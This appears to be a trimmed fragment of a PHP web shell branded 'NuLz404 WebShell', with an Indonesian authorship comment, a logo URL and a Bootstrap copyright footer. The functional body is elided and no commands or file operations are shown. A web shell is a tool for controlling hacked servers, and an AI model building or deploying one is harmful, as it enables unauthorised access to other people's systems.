<?php
/*
Ngikut Bang UnknownSec! inget ya dek, ngikut bukan berarti recode
Mau Recode Izin Dek!
-NuLz404
*/
$shellName = 'NuLz404 WebShell';
$logo = 'https://nulz-archive.vercel.app/archive/nulz.png';
			...
			<div class="col-md-12 my-3">
				<div class="card bg-secondary fw-bold border-dark">
					<div class="card-body text-center">
						Copyright © <span class="text-danger">NuLz404</span></span>
					</div>
				</div>
			</div>
		</div>
